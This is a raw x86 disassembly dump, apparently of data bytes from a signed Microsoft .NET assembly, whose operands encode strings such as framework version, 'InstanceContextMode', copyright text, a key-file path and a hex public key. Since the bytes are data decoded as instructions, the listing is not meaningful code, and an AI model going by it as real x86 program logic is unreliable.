  404275:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  40427d:	inc    ebx
  40427e:	sbb    BYTE PTR gs:[eax],ah
  404281:	ins    DWORD PTR es:[edi],dx
  404282:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  404289:	add    al,0x0
  40428b:	add    DWORD PTR [ecx],eax
  40428d:	or     BYTE PTR [edi],al
  40428f:	and    BYTE PTR [edx],al
  404291:	add    DWORD PTR [ebx*1+0x6042d12],ebx
  404298:	adc    DWORD PTR [eax+0x12006a9],eax
  40429e:	add    DWORD PTR [ecx],edx
  4042a0:	sub    BYTE PTR [ecx+0x12010008],0x80
  4042a7:	mov    cl,0x11
  4042a9:	xor    BYTE PTR [ebp+0x1203200c],0x80
  4042b0:	mov    ecx,0x12b18012
  4042b5:	sub    BYTE PTR [ebp+0x20050e],0x12
  4042bc:	add    cl,0x5
  4042bf:	and    BYTE PTR [ecx],al
  4042c1:	add    DWORD PTR [edx],edx
  4042c3:	sub    DWORD PTR [esi],eax
  4042c5:	and    BYTE PTR [ecx],al
  4042c7:	add    DWORD PTR [edx],edx
  4042c9:	or     cl,0x5
  4042cc:	add    BYTE PTR [ecx],al
  4042ce:	add    DWORD PTR [ecx],edx
  4042d0:	and    DWORD PTR ds:0x80120000,eax
  4042d6:	aad    0x5
  4042d8:	and    BYTE PTR [edx],al
  4042da:	add    DWORD PTR [eax+ebx*1],ebx
  4042dd:	pop    es
  4042de:	and    BYTE PTR [ecx],al
  4042e0:	adc    bh,BYTE PTR [ecx]
  4042e2:	adc    al,BYTE PTR [eax+0x10006d9]
  4042e8:	or     BYTE PTR ds:0x63912,bl
  4042ee:	add    DWORD PTR [ecx],eax
  4042f0:	adc    al,BYTE PTR [eax+0x20007e1]
  4042f6:	add    DWORD PTR [edx],edx
  4042f8:	and    cl,0xe
  4042fb:	sbb    eax,0xc120a07
  404300:	adc    al,BYTE PTR [eax-0x5a7fed5f]
  404306:	adc    al,BYTE PTR [eax-0x1a7fed5b]
  40430c:	adc    al,BYTE PTR [eax-0x1e7fed17]
  404312:	or     BYTE PTR ds:0x121d2d12,bl
  404318:	cmp    DWORD PTR [edx],eax
  40431a:	push   es
  40431b:	push   cs
  40431c:	add    eax,0x80120000
  404321:	icebp  
  404322:	add    al,0x20
  404324:	add    DWORD PTR [esi],ecx
  404326:	push   cs
  404327:	or     DWORD PTR [eax],eax
  404329:	add    ecx,DWORD PTR [esi]
  40432b:	adc    al,BYTE PTR [eax+0x1c1d0ef5]
  404331:	pop    es
  404332:	add    BYTE PTR [ebx],al
  404334:	add    DWORD PTR [eax],ecx
  404336:	push   cs
  404337:	sbb    eax,0x307071c
  40433c:	push   cs
  40433d:	sbb    eax,0x41c1d1c
  404342:	add    BYTE PTR [ecx],al
  404344:	or     BYTE PTR [esi],cl
  404346:	add    eax,0x25120100
  40434b:	or     BYTE PTR ds:0x21110100,al
  404351:	push   cs
  404352:	add    eax,0x80120020
  404357:	std    
  404358:	pop    es
  404359:	add    BYTE PTR [edx],al
  40435b:	or     BYTE PTR [esi],cl
  40435d:	adc    al,BYTE PTR [eax+0x20006f5]
  404363:	add    DWORD PTR [esi],ecx
  404365:	sbb    eax,0x100061c
  40436a:	add    DWORD PTR [edx],edx
  40436c:	xor    cl,0x4
  40436f:	add    BYTE PTR [ecx],al
  404371:	add    DWORD PTR [esi],ecx
  404373:	or     al,0x7
  404375:	add    eax,0xf1801208
  40437a:	adc    al,BYTE PTR [eax+0x1c1d02e1]
  404380:	adc    DWORD PTR [edx+0x1],0x54000300
  404387:	add    bl,BYTE PTR [esi]
  404389:	dec    ecx
  40438a:	outs   dx,BYTE PTR ds:[esi]
  40438b:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  40438f:	gs inc ebp
  404391:	js     0x4043f6
  404393:	gs jo  0x40440a
  404396:	imul   ebp,DWORD PTR [edi+0x6e],0x61746544
  40439d:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x6c756146
  4043a5:	je     0x40441a
  4043a7:	add    DWORD PTR [ebp+edx*2+0x7f],edx
  4043ab:	push   ebx
  4043ac:	jns    0x404421
  4043ae:	je     0x404415
  4043b0:	ins    DWORD PTR es:[edi],dx
  4043b1:	cs push ebx
  4043b3:	gs jb  0x40442c
  4043b6:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  4043bd:	ins    BYTE PTR es:[edi],dx
  4043be:	cs dec ecx
  4043c0:	outs   dx,BYTE PTR ds:[esi]
  4043c1:	jae    0x404437
  4043c3:	popa   
  4043c4:	outs   dx,BYTE PTR ds:[esi]
  4043c5:	arpl   WORD PTR [ebp+0x43],sp
  4043c8:	outs   dx,DWORD PTR ds:[esi]
  4043c9:	outs   dx,BYTE PTR ds:[esi]
  4043ca:	je     0x404431
  4043cc:	js     0x404442
  4043ce:	dec    ebp
  4043cf:	outs   dx,DWORD PTR ds:[esi]
  4043d0:	fs gs sub al,0x20
  4043d4:	push   ebx
  4043d5:	jns    0x40444a
  4043d7:	je     0x40443e
  4043d9:	ins    DWORD PTR es:[edi],dx
  4043da:	cs push ebx
  4043dc:	gs jb  0x404455
  4043df:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  4043e6:	ins    BYTE PTR es:[edi],dx
  4043e7:	sub    al,0x20
  4043e9:	push   esi
  4043ea:	gs jb  0x404460
  4043ed:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  4043f4:	xor    BYTE PTR cs:[esi],ch
  4043f7:	xor    BYTE PTR [eax+eiz*1],ch
  4043fa:	inc    ebx
  4043fb:	jne    0x404469
  4043fd:	je     0x404474
  4043ff:	jb     0x404466
  404401:	cmp    eax,0x7475656e
  404406:	jb     0x404469
  404408:	ins    BYTE PTR es:[edi],dx
  404409:	sub    al,0x20
  40440b:	push   eax
  40440c:	jne    0x404470
  40440e:	ins    BYTE PTR es:[edi],dx
  40440f:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404416:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40441a:	bound  esi,QWORD PTR [edi]
  40441c:	aaa    
  40441d:	popa   
  40441e:	xor    eax,0x31363563
  404423:	cmp    DWORD PTR [ebx],esi
  404425:	xor    al,0x65
  404427:	xor    BYTE PTR [eax],bh
  404429:	cmp    DWORD PTR [ebx],edx
  40442b:	dec    ecx
  40442c:	outs   dx,BYTE PTR ds:[esi]
  40442d:	jae    0x4044a3
  40442f:	popa   
  404430:	outs   dx,BYTE PTR ds:[esi]
  404431:	arpl   WORD PTR [ebp+0x43],sp
  404434:	outs   dx,DWORD PTR ds:[esi]
  404435:	outs   dx,BYTE PTR ds:[esi]
  404436:	je     0x40449d
  404438:	js     0x4044ae
  40443a:	dec    ebp
  40443b:	outs   dx,DWORD PTR ds:[esi]
  40443c:	fs add al,BYTE PTR gs:[eax]
  404440:	add    BYTE PTR [eax],al
  404442:	push   esp
  404443:	push   ebp
  404444:	jnp    0x404499
  404446:	jns    0x4044bb
  404448:	je     0x4044af
  40444a:	ins    DWORD PTR es:[edi],dx
  40444b:	cs push ebx
  40444d:	gs jb  0x4044c6
  404450:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  404457:	ins    BYTE PTR es:[edi],dx
  404458:	cs inc ebx
  40445a:	outs   dx,DWORD PTR ds:[esi]
  40445b:	outs   dx,BYTE PTR ds:[esi]
  40445c:	arpl   WORD PTR [ebp+0x72],si
  40445f:	jb     0x4044c6
  404461:	outs   dx,BYTE PTR ds:[esi]
  404462:	arpl   WORD PTR [ecx+0x4d],di
  404465:	outs   dx,DWORD PTR ds:[esi]
  404466:	fs gs sub al,0x20
  40446a:	push   ebx
  40446b:	jns    0x4044e0
  40446d:	je     0x4044d4
  40446f:	ins    DWORD PTR es:[edi],dx
  404470:	cs push ebx
  404472:	gs jb  0x4044eb
  404475:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40447c:	ins    BYTE PTR es:[edi],dx
  40447d:	sub    al,0x20
  40447f:	push   esi
  404480:	gs jb  0x4044f6
  404483:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  40448a:	xor    BYTE PTR cs:[esi],ch
  40448d:	xor    BYTE PTR [eax+eiz*1],ch
  404490:	inc    ebx
  404491:	jne    0x4044ff
  404493:	je     0x40450a
  404495:	jb     0x4044fc
  404497:	cmp    eax,0x7475656e
  40449c:	jb     0x4044ff
  40449e:	ins    BYTE PTR es:[edi],dx
  40449f:	sub    al,0x20
  4044a1:	push   eax
  4044a2:	jne    0x404506
  4044a4:	ins    BYTE PTR es:[edi],dx
  4044a5:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4044ac:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4044b0:	bound  esi,QWORD PTR [edi]
  4044b2:	aaa    
  4044b3:	popa   
  4044b4:	xor    eax,0x31363563
  4044b9:	cmp    DWORD PTR [ebx],esi
  4044bb:	xor    al,0x65
  4044bd:	xor    BYTE PTR [eax],bh
  4044bf:	cmp    DWORD PTR [edi],ecx
  4044c1:	inc    ebx
  4044c2:	outs   dx,DWORD PTR ds:[esi]
  4044c3:	outs   dx,BYTE PTR ds:[esi]
  4044c4:	arpl   WORD PTR [ebp+0x72],si
  4044c7:	jb     0x40452e
  4044c9:	outs   dx,BYTE PTR ds:[esi]
  4044ca:	arpl   WORD PTR [ecx+0x4d],di
  4044cd:	outs   dx,DWORD PTR ds:[esi]
  4044ce:	fs add al,BYTE PTR gs:[eax]
  4044d2:	add    BYTE PTR [eax],al
  4044d4:	add    eax,0x1311215
  4044d9:	add    cl,BYTE PTR [ecx]
  4044db:	and    BYTE PTR [eax],al
  4044dd:	adc    eax,0x10d8112
  4044e2:	adc    eax,DWORD PTR [eax]
  4044e4:	add    al,0x0
  4044e6:	add    DWORD PTR [ecx],eax
  4044e8:	sbb    al,0x5
  4044ea:	and    BYTE PTR [ecx],al
  4044ec:	add    dl,BYTE PTR [ebx]
  4044ee:	add    BYTE PTR ds:0x81120000,al
  4044f4:	adc    eax,0x13005
  4044f9:	push   ds
  4044fa:	add    BYTE PTR [edx+ecx*1],al
  4044fd:	add    DWORD PTR [edx],edx
  4044ff:	inc    ecx
  404500:	adc    ah,BYTE PTR [eax]
  404502:	pop    es
  404503:	add    DWORD PTR [edx],edx
  404505:	cmp    eax,0x1d811215
  40450a:	add    DWORD PTR [esi],ecx
  40450c:	or     BYTE PTR [edx],al
  40450e:	push   cs
  40450f:	adc    bl,BYTE PTR ds:0x20051912
  404515:	add    BYTE PTR [ecx],dl
  404517:	and    DWORD PTR [ecx],0x201300d
  40451d:	add    DWORD PTR [ecx],edx
  40451f:	and    DWORD PTR [ecx],0x1111215
  404525:	adc    dl,BYTE PTR ds:0x12010a05
  40452b:	and    DWORD PTR ds:0x1012006,0x3e18012
  404535:	and    BYTE PTR [eax],al
  404537:	push   cs
  404538:	or     BYTE PTR ds:0x12d8112,dl
  40453e:	adc    al,BYTE PTR [ecx+0x2200629]
  404544:	add    DWORD PTR [ebx],edx
  404546:	add    BYTE PTR [esi],cl
  404548:	add    eax,0x81120020
  40454d:	xor    DWORD PTR [edx],ecx
  40454f:	and    BYTE PTR [eax],al
  404551:	adc    eax,0x1358112
  404556:	adc    al,BYTE PTR [eax+0x121508e1]
  40455c:	xor    DWORD PTR ds:0xe1801201,0x15002009
  404566:	adc    al,BYTE PTR [ecx+0x130139]
  40456c:	or     BYTE PTR ds:0x1398112,dl
  404572:	adc    al,BYTE PTR [eax+0x2004e1]
  404578:	adc    eax,DWORD PTR [eax]
  40457a:	add    eax,0x8010200
  40457f:	push   cs
  404580:	add    esp,DWORD PTR [eax]
  404582:	add    BYTE PTR [edx],al
  404584:	push   ds
  404585:	pop    es
  404586:	or     BYTE PTR [edx],dl
  404588:	inc    ecx
  404589:	adc    al,BYTE PTR [ecx+0x3d811219]
  40458f:	adc    al,BYTE PTR [ecx-0x1e7fedcf]
  404595:	adc    al,BYTE PTR [ecx-0x1e7fedc3]
  40459b:	adc    eax,0x1398112
  4045a0:	adc    al,BYTE PTR [eax+0x40713e1]
  4045a6:	adc    al,BYTE PTR [ecx+0x31811249]
  4045ac:	adc    al,BYTE PTR [eax-0x7eedea1f]
  4045b2:	cmp    DWORD PTR [ecx],eax
  4045b4:	adc    al,BYTE PTR [eax+0x10008e1]
  4045ba:	adc    al,BYTE PTR [eax-0x1e7fed1f]
  4045c0:	inc    esi
  4045c1:	add    DWORD PTR [eax],eax
  4045c3:	sub    DWORD PTR [esi],ebp
  4045c5:	dec    esi
  4045c6:	inc    ebp
  4045c7:	push   esp
  4045c8:	inc    esi
  4045c9:	jb     0x40462c
  4045cb:	ins    DWORD PTR es:[edi],dx
  4045cc:	gs ja  0x40463e
  4045cf:	jb     0x40463c
  4045d1:	sub    al,0x56
  4045d3:	gs jb  0x404649
  4045d6:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  4045dd:	xor    eax,0x6f72502c
  4045e2:	imul   bp,WORD PTR [ebp+eiz*2+0x3d],0x6c43
  4045e9:	imul   esp,DWORD PTR [ebp+0x6e],0x54000174
  4045f0:	push   cs
  4045f1:	adc    al,0x46
  4045f3:	jb     0x404656
  4045f5:	ins    DWORD PTR es:[edi],dx
  4045f6:	gs ja  0x404668
  4045f9:	jb     0x404666
  4045fb:	inc    esp
  4045fc:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  404603:	popa   
  404604:	ins    DWORD PTR es:[edi],dx
  404605:	add    BYTE PTR gs:0x1,al
  40460c:	add    BYTE PTR [edx],bl
  40460e:	add    DWORD PTR [eax],eax
  404610:	adc    eax,0x6e415643
  404615:	popa   
  404616:	ins    BYTE PTR es:[edi],dx
  404617:	jns    0x40468c
  404619:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  404620:	arpl   WORD PTR [ebp+0x2e],sp
  404623:	gs js  0x40468b
  404626:	add    BYTE PTR [eax],al
  404628:	sbb    al,BYTE PTR [ecx]
  40462a:	add    BYTE PTR ds:0x7263694d,dl
  404630:	outs   dx,DWORD PTR ds:[esi]
  404631:	jae    0x4046a2
  404633:	data16 je 0x404656
  404636:	inc    ebx
  404637:	outs   dx,DWORD PTR ds:[esi]
  404638:	jb     0x4046aa
  40463a:	outs   dx,DWORD PTR ds:[esi]
  40463b:	jb     0x40469e
  40463d:	je     0x4046a8
  40463f:	outs   dx,DWORD PTR ds:[esi]
  404640:	outs   dx,BYTE PTR ds:[esi]
  404641:	add    BYTE PTR [eax],al
  404643:	and    eax,0x4d200001
  404648:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40464f:	je     0x404613
  404651:	scas   al,BYTE PTR es:[edi]
  404652:	and    BYTE PTR [esi+0x69],dl
  404655:	jae    0x4046cc
  404657:	popa   
  404658:	ins    BYTE PTR es:[edi],dx
  404659:	and    BYTE PTR [ebx+0x74],dl
  40465c:	jne    0x4046c2
  40465e:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  404665:	xor    DWORD PTR [edx],esi
  404667:	add    BYTE PTR [eax],al
  404669:	xor    eax,DWORD PTR [ecx]
  40466b:	add    BYTE PTR [esi],ch
  40466d:	ret    0x20a9
  404670:	dec    ebp
  404671:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404678:	je     0x40469a
  40467a:	inc    ebx
  40467b:	outs   dx,DWORD PTR ds:[esi]
  40467c:	jb     0x4046ee
  40467e:	outs   dx,DWORD PTR ds:[esi]
  40467f:	jb     0x4046e2
  404681:	je     0x4046ec
  404683:	outs   dx,DWORD PTR ds:[esi]
  404684:	outs   dx,BYTE PTR ds:[esi]
  404685:	and    BYTE PTR cs:[ecx+0x6c],al
  404689:	ins    BYTE PTR es:[edi],dx
  40468a:	and    BYTE PTR [edx+0x69],dh
  40468d:	addr16 push 0x72207374
  404693:	gs jae 0x4046fb
  404696:	jb     0x40470e
  404698:	gs fs add BYTE PTR cs:[eax],al
  40469d:	adc    DWORD PTR [ecx],eax
  40469f:	add    BYTE PTR [ecx+esi*1],cl
  4046a2:	xor    DWORD PTR [esi],ebp
  4046a4:	xor    BYTE PTR [esi],ch
  4046a6:	xor    eax,0x37323730
  4046ab:	xor    DWORD PTR cs:[eax],eax
  4046ae:	add    BYTE PTR ds:0x31080001,cl
  4046b4:	xor    DWORD PTR [esi],ebp
  4046b6:	xor    BYTE PTR [esi],ch
  4046b8:	xor    BYTE PTR [esi],ch
  4046ba:	xor    BYTE PTR [eax],al
  4046bc:	add    BYTE PTR [edx],cl
  4046be:	add    DWORD PTR [eax],eax
  4046c0:	add    eax,0x552d6e65
  4046c5:	push   ebx
  4046c6:	add    BYTE PTR [eax],al
  4046c8:	add    eax,0x10001
  4046cd:	add    BYTE PTR [edx],ch
  4046cf:	add    DWORD PTR [eax],eax
  4046d1:	and    eax,0x645c3a46
  4046d6:	fs pop esp
  4046d8:	je     0x404749
  4046da:	outs   dx,DWORD PTR ds:[esi]
  4046db:	ins    BYTE PTR es:[edi],dx
  4046dc:	jae    0x40473a
  4046de:	fs gs jbe 0x404746
  4046e2:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  4046e9:	ins    BYTE PTR es:[edi],dx
  4046ea:	push   eax
  4046eb:	jne    0x40474f
  4046ed:	ins    BYTE PTR es:[edi],dx
  4046ee:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  4046f5:	outs   dx,BYTE PTR ds:[esi]
  4046f6:	imul   eax,DWORD PTR [eax],0x0
  4046f9:	or     DWORD PTR [eax+0x1],0x0
  4046fd:	add    BYTE PTR [eax+0x30],0x30
  404701:	xor    dh,BYTE PTR [eax+esi*1]
  404704:	xor    BYTE PTR [eax],dh
  404706:	xor    BYTE PTR [eax],dh
  404708:	arpl   WORD PTR [eax],di
  40470a:	xor    BYTE PTR [eax],dh
  40470c:	xor    BYTE PTR [eax],dh
  40470e:	xor    BYTE PTR [ecx],dh
  404710:	xor    al,0x30
  404712:	xor    DWORD PTR [eax],esi
  404714:	xor    BYTE PTR [eax],dh
  404716:	xor    BYTE PTR [eax],dh
  404718:	xor    BYTE PTR ss:[edx],dh
  40471b:	xor    BYTE PTR [eax],dh
  40471d:	xor    BYTE PTR [eax],dh
  40471f:	xor    BYTE PTR [eax],dh
  404721:	xor    dh,BYTE PTR [eax+esi*1]
  404724:	xor    BYTE PTR [eax],dh
  404726:	xor    BYTE PTR ds:0x34333532,dh
  40472c:	xor    DWORD PTR [ebx],esi
  40472e:	xor    DWORD PTR [eax],esi
  404730:	xor    BYTE PTR [eax],dh
  404732:	cmp    BYTE PTR [eax],dh
  404734:	xor    BYTE PTR [eax],dh
  404736:	xor    BYTE PTR [eax],dh
  404738:	xor    DWORD PTR [eax],esi
  40473a:	xor    BYTE PTR [eax],dh
  40473c:	xor    DWORD PTR [eax],esi
  40473e:	xor    BYTE PTR [esi],dh
  404740:	xor    DWORD PTR [ebx],esi
  404742:	xor    edi,DWORD PTR [ecx]
  404744:	cmp    DWORD PTR [ecx+0x66],esp
  404747:	xor    WORD PTR [eax],di
  40474a:	xor    WORD PTR gs:[ecx+0x32],sp
  40474f:	arpl   WORD PTR [edx],si
  404751:	xor    eax,0x32613431
  404756:	aaa    
  404757:	xor    esp,DWORD PTR [ecx+0x34]
  40475a:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  40475e:	xor    al,0x32
  404760:	bound  esi,QWORD PTR [edi]
  404762:	xor    dh,BYTE PTR [ebx]
  404764:	xor    dh,BYTE PTR [ecx]
  404766:	xor    WORD PTR [edi],si
  404769:	xor    eax,0x32303137
  40476e:	cmp    WORD PTR fs:[ebp+0x62],sp
  404773:	popa   
  404774:	fs popa 
  404776:	cmp    DWORD PTR ss:[ecx],edi
  404779:	xor    dh,BYTE PTR [ebx]
  40477b:	xor    dh,BYTE PTR gs:[edi]
  40477e:	xor    edi,DWORD PTR [eax]
  404780:	xor    al,0x30
  404782:	arpl   WORD PTR ss:[edx],si
  404785:	xor    DWORD PTR [ebp+0x35],esp
  404788:	bound  edi,QWORD PTR [eax]
  40478a:	xor    BYTE PTR [ecx],dh
  40478c:	xor    eax,0x62613235
  404791:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  404795:	xor    BYTE PTR [ecx+0x36],ah
  404798:	xor    eax,0x35333261
  40479d:	xor    BYTE PTR gs:[eax],dh
  4047a0:	xor    DWORD PTR [ecx+0x63],esp
  4047a3:	cmp    DWORD PTR [ecx+0x64],esp
  4047a6:	arpl   WORD PTR [edx],si
  4047a8:	xor    eax,0x38643266
  4047ad:	xor    DWORD PTR [ecx],esi
  4047af:	bound  esi,QWORD PTR gs:[eax]
  4047b2:	cmp    DWORD PTR [ecx+edi*1],esi
  4047b5:	ss popa 
  4047b7:	xor    al,0x63
  4047b9:	ss popa 
  4047bb:	xor    eax,0x36346439
  4047c0:	xor    DWORD PTR [ecx],edi
  4047c2:	xor    eax,0x36633938
  4047c7:	cmp    DWORD PTR [esi+0x35],esp
  4047ca:	bound  esp,QWORD PTR [ecx+0x66]
  4047cd:	xor    BYTE PTR [ebx+0x34],ah
  4047d0:	xor    DWORD PTR [edi],esi
  4047d2:	cmp    DWORD PTR [ecx+0x34],esp
  4047d5:	aaa    
  4047d6:	xor    esi,DWORD PTR [ecx]
  4047d8:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  4047dc:	xor    eax,0x64633535
  4047e1:	xor    BYTE PTR [eax],dh
  4047e3:	ss popa 
  4047e5:	arpl   WORD PTR [ebx+0x38],sp
  4047e8:	bound  esi,QWORD PTR ds:0x66393539
  4047ee:	xor    ah,BYTE PTR [edx+0x64]
  4047f1:	ss xor DWORD PTR gs:[eax],esi
  4047f5:	xor    esi,DWORD PTR gs:[esi]
  4047f8:	xor    BYTE PTR [ebx+0x33],ah
  4047fb:	xor    al,0x35
  4047fd:	xor    esi,DWORD PTR [edi]
  4047ff:	popa   
  404800:	xor    DWORD PTR [edx+esi*1+0x36],esp
  404804:	ss fs popa 
  404807:	cmp    BYTE PTR [eax],dh
  404809:	cmp    BYTE PTR ds:0x35363538,dh
  40480f:	cmp    BYTE PTR [ebx],dh
  404811:	arpl   WORD PTR [eax],di
  404813:	xor    eax,0x64313864
  404818:	popa   
  404819:	aaa    
  40481a:	xor    sp,WORD PTR [ebp+0x63]
  40481e:	xor    BYTE PTR [ecx],dh
  404820:	gs cmp DWORD PTR fs:0x35633436,esi
  404828:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  40482c:	fs aaa 
  40482e:	xor    DWORD PTR [ebx],esi
  404830:	arpl   WORD PTR [eax+esi*1+0x31],sp
  404834:	aaa    
  404835:	xor    ah,BYTE PTR [ebx+0x38]
  404838:	xor    dh,BYTE PTR gs:[ebx]
  40483b:	popa   
  40483c:	xor    DWORD PTR [eax],esi
  40483e:	data16 xor BYTE PTR [edx],dh
  404841:	xor    edi,DWORD PTR [ecx]
  404843:	bound  edi,QWORD PTR [eax]
  404845:	xor    BYTE PTR [ebx+0x39],ah
  404848:	bound  esi,QWORD PTR ss:[eax]
  40484b:	aaa    
  40484c:	aaa    
  40484d:	xor    esi,DWORD PTR [esi]
  40484f:	xor    ax,0x3864
  404853:	bound  esi,QWORD PTR [eax]
  404855:	xor    dh,BYTE PTR [edx]
  404857:	xor    eax,0x34613234
  40485c:	gs aaa 
  40485e:	xor    al,0x32
  404860:	xor    eax,0x66356131
  404865:	xor    al,0x33
  404867:	xor    bh,BYTE PTR [eax]
  404869:	xor    dh,BYTE PTR [ebx+esi*1]
  40486c:	xor    DWORD PTR [eax],edi
  40486e:	bound  esi,QWORD PTR [ebx]
  404870:	xor    eax,0x35613933
  404875:	popa   
  404876:	xor    BYTE PTR [eax],bh
  404878:	aaa    
  404879:	data16 cmp BYTE PTR [ebp+0x35],ah
  40487d:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  404881:	xor    DWORD PTR [ebx],esi
  404883:	xor    eax,0x61633966
  404888:	xor    al,0x37
  40488a:	xor    sp,WORD PTR [edx+0x62]
  40488e:	xor    ah,BYTE PTR [ebp+0x31]
  404891:	xor    BYTE PTR [ecx+0x66],ah
  404894:	data16 xor BYTE PTR [ecx+0x66],ah
  404898:	xor    BYTE PTR [eax],bh
  40489a:	xor    al,0x39
  40489c:	xor    eax,0x62663430
  4048a1:	aaa    
  4048a2:	arpl   WORD PTR [ebp+0x61],sp
  4048a5:	xor    esp,DWORD PTR [esi+0x66]
  4048a8:	xor    DWORD PTR [ecx],edi
  4048aa:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  4048ae:	fs xor BYTE PTR gs:[ebp+0x64],ah
  4048b3:	popa   
  4048b4:	fs ss xor al,0x63
  4048b8:	cmp    BYTE PTR ss:[ebp+0x66],ah
  4048bc:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  4048c1:	xor    eax,0x30336436
  4048c6:	xor    ah,BYTE PTR [ecx+0x64]
  4048c9:	xor    eax,0x36646635
  4048ce:	cmp    BYTE PTR gs:[eax],dh
  4048d1:	xor    si,WORD PTR [eax]
  4048d4:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  4048d8:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  4048dd:	cmp    DWORD PTR gs:0x38353633,esi
  4048e4:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  4048ec:	bound  esi,QWORD PTR ds:0x63363366
  4048f2:	xor    eax,0x66653234
  4048f7:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  4048fc:	data16 cmp BYTE PTR [eax],bh
  4048ff:	cmp    BYTE PTR ds:0x33643833,dh
  404905:	aaa    
  404906:	xor    al,0x63
  404908:	xor    WORD PTR gs:[eax],si
  40490c:	ss popa 
  40490e:	arpl   WORD PTR [esi+0x37],sp
  404911:	cmp    DWORD PTR fs:[ebx],esi
  404914:	popa   
  404915:	xor    al,0x34
  404917:	xor    al,0x35
  404919:	arpl   WORD PTR [ebx],si
  40491b:	arpl   WORD PTR [edi],si
  40491d:	xor    esp,DWORD PTR [ebx+0x64]
  404920:	cmp    DWORD PTR [ecx],esi
  404922:	xor    DWORD PTR [esi+0x30],esp
  404925:	xor    eax,0x61613137
  40492a:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  40492f:	fs popa 
  404931:	xor    DWORD PTR [edx],esi
  404933:	bound  esi,QWORD PTR [ecx]
  404935:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  404939:	arpl   WORD PTR [ebx],si
  40493b:	aaa    
  40493c:	xor    eax,0x813362
  404941:	popa   
  404942:	xor    eax,0x36363861
  404947:	xor    DWORD PTR gs:[ebp+0x65],esp
  40494b:	xor    DWORD PTR [eax],edi
  40494d:	data16 cmp BYTE PTR ss:[eax],dh
  404951:	aaa    
  404952:	ss cmp BYTE PTR ss:[edx],dh
  404956:	xor    BYTE PTR [ecx],bh
  404958:	xor    sp,WORD PTR [edx+0x31]
  40495c:	xor    DWORD PTR [edx],esi
  40495e:	xor    esi,DWORD PTR [esi]
  404960:	popa   
  404961:	arpl   WORD PTR [ebp+0x35],sp
  404964:	xor    dh,BYTE PTR gs:[ecx]
  404967:	xor    WORD PTR [ecx],si
  40496a:	aaa    
  40496b:	cmp    BYTE PTR [eax],dh
  40496d:	xor    esp,DWORD PTR [ecx+0x33]
  404970:	xor    DWORD PTR [ebx+esi*1],esi
  404973:	popa   
  404974:	bound  esp,QWORD PTR [edx+0x31]
  404977:	xor    dh,BYTE PTR [esi]
  404979:	fs xor BYTE PTR fs:[ebx],dh
  40497d:	xor    eax,0x32643764
  404982:	data16 cmp BYTE PTR [edi],dh
  404985:	bound  esi,QWORD PTR ss:[esi]
  404988:	cmp    DWORD PTR [ebx],esi
  40498a:	cmp    BYTE PTR [ecx+0x61],ah
  40498d:	data16 xor ah,BYTE PTR [ebp+0x65]
  404991:	xor    esi,DWORD PTR [ecx+esi*1]
  404994:	xor    al,0x64
  404996:	xor    eax,0x64303234
  40499b:	aaa    
  40499c:	xor    eax,0x31323633
  4049a1:	xor    al,0x30
  4049a3:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  4049a7:	xor    al,0x61
  4049a9:	xor    al,0x39
  4049ab:	arpl   WORD PTR [eax+edi*1],si
  4049ae:	arpl   WORD PTR ss:[ebp+0x31],sp
  4049b2:	xor    esi,DWORD PTR [ebx+esi*1]
  4049b5:	xor    BYTE PTR [eax],dh
  4049b7:	popa   
  4049b8:	xor    dh,BYTE PTR [ecx]
  4049ba:	xor    BYTE PTR [esi],dh
  4049bc:	popa   
  4049bd:	bound  esi,QWORD PTR fs:[esi]
  4049c0:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  4049c4:	xor    esi,DWORD PTR [ebx]
  4049c6:	xor    eax,0x65663039
  4049cb:	data16 cmp BYTE PTR [ecx+0x64],ah
  4049cf:	xor    eax,0x63333463
  4049d4:	bound  esp,QWORD PTR [ecx+0x38]
  4049d7:	xor    dh,BYTE PTR [edx]
  4049d9:	cmp    DWORD PTR [eax],esi
  4049db:	arpl   WORD PTR fs:[ecx+edi*1],si
  4049df:	xor    eax,0x66653033
  4049e4:	data16 cmp BYTE PTR fs:[esi],dh
  4049e8:	xor    eax,0x39643332
  4049ed:	xor    al,0x38
  4049ef:	xor    esp,DWORD PTR [ebx+0x30]
  4049f2:	xor    BYTE PTR [esi+0x34],ah
  4049f5:	xor    eax,0x34666138
  4049fa:	cmp    BYTE PTR ss:[ecx],bh
  4049fd:	xor    BYTE PTR [eax],dh
  4049ff:	xor    esi,DWORD PTR [esi]
  404a01:	bound  esi,QWORD PTR [eax]
  404a03:	xor    ah,BYTE PTR gs:[ebx+0x36]
  404a07:	xor    DWORD PTR [eax+esi*1+0x37],esp
  404a0b:	aaa    
